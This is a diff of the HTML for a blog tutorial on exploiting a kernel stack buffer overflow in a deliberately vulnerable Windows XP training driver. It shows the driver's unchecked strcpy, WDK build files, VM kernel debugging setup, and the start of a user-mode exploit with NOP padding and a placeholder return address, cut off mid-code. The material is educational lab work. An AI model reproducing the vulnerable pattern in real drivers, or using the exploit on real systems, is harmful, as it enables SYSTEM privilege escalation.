@@ -1,160 +1,152 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html>
   <head>
-  <meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-
-  <title>Kernel buffer overflow on Windows</title>
-  <meta name="description" content="The buffer overflow are cool in user-land but they can be more funny in kernel-land. This time, we will use a buffer overflow to make an escalade privilege t...">
-  <link rel="canonical" href="https://dimitrifourny.github.io/2014/02/26/kernel-buffer-overflow.html">
-
-  <link rel="stylesheet" href="/assets/css/style.css">
-  <link rel="stylesheet" href="/assets/css/syntax-github.css">
-  <link rel="shortcut icon" href="/assets/img/favicon.png">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
-  <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Source+Code+Pro&display=swap" rel="stylesheet">
-</head>
-
-
-  <bodys>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+    <title>
+  Kernel buffer overflow on Windows &ndash; Dimitri Fourny
+</title>
+  
+    <meta name="description" content="Personal website and computer security blog.">
+    <link rel="canonical" href="https://dimitrifourny.github.io/">
+  
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax-github.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" rel="stylesheet">
+  
+    <link rel="shortcut icon" href="/img/favicon.png">
     
-  <div id="navigation">
-    <nav id="primary-nav"><a href="/">Home</a><span> | </span><a href="/about">About</a><span> | </span><a href="https://github.com/DimitriFourny">Github</a><span> | </span><a href="https://twitter.com/DimitriFourny">Twitter</a><span> | </span><a href="https://infosec.exchange/@dimitrifourny">Mastodon</a><span> | </span><a href="https://www.linkedin.com/in/dimitrifourny/">Linkedin</a></nav>
-  </div>
-
-
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto&family=Source+Code+Pro&display=swap" rel="stylesheet">
+  </head>
+  <body>
     <header>
-  <div id="masthead">
-    <div id="site-title">Dimitri Fourny</div>
-    <div id="site-description">Personal website and computer security blog.</p>
-  </div>
-</header>
-
-
-    <main id="main" class="main-content" aria-label="Content">
-  <article class="h-entry">
-    <div class="page-wrapper">
-      <header class="page-header">
+      <div id="nav-header">
+        <div id="nav-logo">
+          <div id="site-title"><a href="/">Dimitri Fourny</a></div>
+          <div id="site-description">Personal website and computer security blog.</div>
+        </div>
         
-        <h1 id="page-title" class="page-title p-name">Kernel buffer overflow on Windows
-</h1>
-      </header>
+        <nav>
+          <a href="/">Home</a>
+          <a href="/about.html">About</a>
+          <a href="https://github.com/DimitriFourny"><i class="fa-brands fa-github"></i></a>
+          <a href="https://infosec.exchange/@dimitrifourny"><i class="fa-brands fa-mastodon"></i></a>
+          <a href="https://twitter.com/DimitriFourny"><i class="fa-brands fa-twitter"></i></a>
+          <a href="https://www.linkedin.com/in/dimitrifourny/"><i class="fa-brands fa-linkedin"></i></a>
+        </nav>
+      </div>
+    </header>    
 
-      <div class="page-content">
-        <div class="e-content">
-          <p>The buffer overflow are cool in user-land but they can be more funny in 
-kernel-land. This time, we will use a buffer overflow to make an escalade 
-privilege to get the SYSTEM rights, so we will could make anything we want on 
-the system. To train us, we don’t need to code a driver by ourself: 0vercl0k 
+    <div id="content">
+<section>
+  <article class="page-content">
+    <h1>Kernel buffer overflow on Windows</h1>
+    <p>The buffer overflow are cool in user-land but they can be more funny in
+kernel-land. This time, we will use a buffer overflow to make an escalade
+privilege to get the SYSTEM rights, so we will could make anything we want on
+the system. To train us, we don&rsquo;t need to code a driver by ourself: 0vercl0k
 have done it for us! So we got the level 1 files and we start our XP VM.</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Ntifs.h&gt;
-</span>
-<span class="cp">#define ERROR(_f_, _status_) DbgPrint("\r\n[!] Error at %s() : 0x%x\r\n", _f_, _status_)
-#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)
-</span>
-<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">DWORD</span><span class="p">;</span>
-<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
-<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>
-
-<span class="c1">//</span>
-<span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
-<span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
-<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
-<span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
-<span class="c1">//</span>
-
-<span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
-    <span class="n">UNICODE_STRING</span> <span class="n">deviceName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">},</span> <span class="n">symlinkName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-    <span class="n">PDEVICE_OBJECT</span> <span class="n">pDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-
-    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">Unload</span><span class="p">;</span>
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Loading.. ]</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
-
-    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">1"</span><span class="p">);</span>
-    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="s">L"</span><span class="se">\\</span><span class="s">DosDevices</span><span class="se">\\</span><span class="s">1"</span><span class="p">);</span>
-
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Creating the device...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">IoCreateDevice</span><span class="p">(</span>
-        <span class="n">pDriverObj</span><span class="p">,</span>
-        <span class="mi">0</span><span class="p">,</span>
-        <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span>
-        <span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span>
-        <span class="n">FILE_DEVICE_SECURE_OPEN</span><span class="p">,</span>
-        <span class="n">FALSE</span><span class="p">,</span>
-        <span class="o">&amp;</span><span class="n">pDevice</span>
-    <span class="p">);</span>
-
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Linking...]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">IoCreateSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">);</span>
-
-    <span class="k">for</span><span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">IRP_MJ_MAXIMUM_FUNCTION</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
-        <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIRP</span><span class="p">;</span>
-
-    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
-    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="n">NTSTATUS</span> <span class="nf">handleIRP</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="n">NTSTATUS</span> <span class="nf">handleIOCTLs</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">pIrp</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">PIO_STACK_LOCATION</span> <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">ULONG</span> <span class="n">ioControlCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">BYTE</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-
-    <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="n">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">pIrp</span><span class="p">);</span>
-    <span class="n">ioControlCode</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">;</span>
-    <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">InputBufferLength</span><span class="p">;</span>
-    <span class="n">inputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>
-
-    <span class="k">switch</span><span class="p">(</span><span class="n">ioControlCode</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="k">case</span> <span class="n">IOCTL_HI</span><span class="p">:</span>
-        <span class="p">{</span>
-            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Let's copying this buffer...]"</span><span class="p">);</span>
-
-            <span class="cm">/* ! w00tz ! */</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">);</span>
-            <span class="k">break</span><span class="p">;</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-
-    <span class="n">IoCompleteRequest</span><span class="p">(</span><span class="n">pIrp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
-    <span class="k">return</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="n">VOID</span> <span class="nf">Unload</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDrivObj</span><span class="p">)</span>
-<span class="p">{</span>
-    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">"[ Unloading.. ]</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="k">return</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<p>It’s easy to see the problem: the copy size in <code class="highlighter-rouge">strcpy</code> is not checked!</p>
-
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Ntifs.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define ERROR(_f_, _status_) DbgPrint(&#34;\r\n[!] Error at %s() : 0x%x\r\n&#34;, _f_, _status_)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define DbgPrint(...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0x1337, __VA_ARGS__)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">DWORD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">PBYTE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">BYTE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">DRIVER_UNLOAD</span> <span class="n">Unload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DRIVER_INITIALIZE</span> <span class="n">DriverEntry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DRIVER_DISPATCH</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">DRIVER_DISPATCH</span> <span class="n">handleIRP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">DriverEntry</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDriverObj</span> <span class="p">,</span> <span class="n">PUNICODE_STRING</span> <span class="n">pRegistryPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">UNICODE_STRING</span> <span class="n">deviceName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">},</span> <span class="n">symlinkName</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PDEVICE_OBJECT</span> <span class="n">pDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">DriverUnload</span> <span class="o">=</span> <span class="n">Unload</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Loading.. ]</span><span class="se">\r\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">Device</span><span class="se">\\</span><span class="s">1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RtlInitUnicodeString</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\</span><span class="s">DosDevices</span><span class="se">\\</span><span class="s">1&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Creating the device...]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IoCreateDevice</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pDriverObj</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_DEVICE_UNKNOWN</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_DEVICE_SECURE_OPEN</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FALSE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="o">&amp;</span><span class="n">pDevice</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Linking...]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IoCreateSymbolicLink</span><span class="p">(</span><span class="o">&amp;</span><span class="n">symlinkName</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">deviceName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">IRP_MJ_MAXIMUM_FUNCTION</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIRP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pDriverObj</span><span class="o">-&gt;</span><span class="n">MajorFunction</span><span class="p">[</span><span class="n">IRP_MJ_DEVICE_CONTROL</span><span class="p">]</span> <span class="o">=</span> <span class="n">handleIOCTLs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">handleIRP</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">Irp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">handleIOCTLs</span><span class="p">(</span><span class="n">PDEVICE_OBJECT</span> <span class="n">pDeviceObject</span><span class="p">,</span> <span class="n">PIRP</span> <span class="n">pIrp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PIO_STACK_LOCATION</span> <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">ioControlCode</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">inputBuffer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pIoStackLocation</span> <span class="o">=</span> <span class="n">IoGetCurrentIrpStackLocation</span><span class="p">(</span><span class="n">pIrp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ioControlCode</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">IoControlCode</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">inputBufferLength</span> <span class="o">=</span> <span class="n">pIoStackLocation</span><span class="o">-&gt;</span><span class="n">Parameters</span><span class="p">.</span><span class="n">DeviceIoControl</span><span class="p">.</span><span class="n">InputBufferLength</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">inputBuffer</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">AssociatedIrp</span><span class="p">.</span><span class="n">SystemBuffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span><span class="p">(</span><span class="n">ioControlCode</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">IOCTL_HI</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Let&#39;s copying this buffer...]&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="cm">/* ! w00tz ! */</span>
+</span></span><span class="line"><span class="cl">            <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">inputBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">IoCompleteRequest</span><span class="p">(</span><span class="n">pIrp</span><span class="p">,</span> <span class="n">IO_NO_INCREMENT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pIrp</span><span class="o">-&gt;</span><span class="n">IoStatus</span><span class="p">.</span><span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">Unload</span><span class="p">(</span><span class="n">PDRIVER_OBJECT</span> <span class="n">pDrivObj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DbgPrint</span><span class="p">(</span><span class="s">&#34;[ Unloading.. ]</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>It&rsquo;s easy to see the problem: the copy size in <code>strcpy</code> is not checked!</p>
 <h2 id="tools">Tools</h2>
-
-<p>To test the driver, we will need the Windows Driver Kit, WinDbg and an assembly 
-code compiler, FASM. To compile with the WDK, we need to make a file with the 
-name <code class="highlighter-rouge">makefile</code>:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>!INCLUDE $(NTMAKEENV)\makefile.def
-</code></pre></div></div>
-
-<p>Fo a driver, the file <code class="highlighter-rouge">sources</code> has this content:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARGETNAME = level1
+<p>To test the driver, we will need the Windows Driver Kit, WinDbg and an assembly
+code compiler, FASM. To compile with the WDK, we need to make a file with the
+name <code>makefile</code>:</p>
+<pre tabindex="0"><code>!INCLUDE $(NTMAKEENV)\makefile.def
+</code></pre><p>Fo a driver, the file <code>sources</code> has this content:</p>
+<pre tabindex="0"><code>TARGETNAME = level1
 TARGETPATH = obj
 TARGETTYPE = DRIVER
 
@@ -162,11 +154,8 @@ INCLUDES = %BUILD%\inc
 LIBS = %BUILD%\lib
 
 SOURCES = level1.c
-</code></pre></div></div>
-
-<p>And the <code class="highlighter-rouge">sources</code> file for a simple .exe:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TARGETNAME=exploit
+</code></pre><p>And the <code>sources</code> file for a simple .exe:</p>
+<pre tabindex="0"><code>TARGETNAME=exploit
 TARGETTYPE=PROGRAM
 
 INCLUDES=
@@ -177,51 +166,43 @@ UMTYPE=console
 UMBASE=0x04000000
 
 USE_MSVCRT=1
-</code></pre></div></div>
-
-<h2 id="debug-a-vm">Debug a VM</h2>
-
-<p>In Windows VM, <code class="highlighter-rouge">msconfig.exe -&gt; BOOT.ini -&gt; Advanced -&gt; /DEBUG /DEBUGPORT=COM1:</code>
-and reboot. In VirtualBox, <code class="highlighter-rouge">Machine -&gt; Settings -&gt; Serial Ports</code> and configure it.
-In WinDbg, <code class="highlighter-rouge">File -&gt; Kernel Debug... -&gt; COM</code> and click on OK.</p>
-
+</code></pre><h2 id="debug-a-vm">Debug a VM</h2>
+<p>In Windows VM, <code>msconfig.exe -&gt; BOOT.ini -&gt; Advanced -&gt; /DEBUG /DEBUGPORT=COM1:</code>
+and reboot. In VirtualBox, <code>Machine -&gt; Settings -&gt; Serial Ports</code> and configure it.
+In WinDbg, <code>File -&gt; Kernel Debug... -&gt; COM</code> and click on OK.</p>
 <h2 id="exploitation">Exploitation</h2>
-
 <p>Now, we can load our driver with Driver Loader and test our entry:</p>
-
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;windows.h&gt;
-#include &lt;winioctl.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-</span>
-<span class="cp">#define IOCTL_HI CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define DEVICE_NAME "\\\\.\\1"
-</span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">lenMagik</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
-    <span class="n">UCHAR</span> <span class="n">magik</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-
-    <span class="n">memset</span><span class="p">(</span><span class="n">magik</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mi">276</span><span class="p">);</span> <span class="c1">// Padding</span>
-    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">276</span><span class="p">;</span>
-    <span class="n">memcpy</span><span class="p">(</span><span class="n">magik</span><span class="o">+</span><span class="mi">276</span><span class="p">,</span> <span class="s">"</span><span class="se">\x42\x42\x42\x42\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span> <span class="c1">// Shellcode address?</span>
-    <span class="n">lenMagik</span> <span class="o">+=</span> <span class="mi">5</span><span class="p">;</span>
-
-    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
